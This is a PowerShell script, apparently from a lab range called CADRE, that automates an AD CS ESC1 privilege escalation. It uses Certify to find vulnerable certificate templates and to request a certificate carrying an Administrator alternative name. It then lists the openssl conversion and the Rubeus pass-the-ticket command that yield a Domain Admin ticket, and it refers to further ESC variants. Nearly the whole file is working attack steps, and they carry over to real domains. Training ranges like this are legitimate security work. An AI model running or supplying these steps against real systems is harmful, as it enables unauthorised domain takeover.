# CADRE — WT#050-061 ADCS ESC (Certify) — CA: cadre-CA on dc01
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
param([string]$Esc = "ESC1")
print_banner "WT#050+ - ADCS $Esc"
start_attack "050" "ADCS $Esc"
require_tool Certify.exe

step "Find vulnerable templates"
run_cmd "Certify.exe find /vulnerable"

step "WT#050 ESC1: request a cert with arbitrary SAN (impersonate a DA)"
run_cmd "Certify.exe request /ca:$CA_HOST\$CA_NAME /template:CADRE-ESC1 /altname:Administrator@$DOMAIN_ROOT"

step "Convert to PFX, then auth with Rubeus to get the DA TGT"
run_cmd "Write-Host '  openssl pkcs12 -export -in cert.pem -out cert.pfx'"
run_cmd "Write-Host '  Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:<pw> /ptt'"

step "ESC variants: swap template/flags — ESC2/3/4/6/7/8/9/10/11/13/14 per WT#051-061"
run_cmd "Write-Host '  e.g. Certify.exe request /ca:... /template:CADRE-ESC9 (no security ext) etc.'"

result $LASTEXITCODE "ADCS $Esc completed"
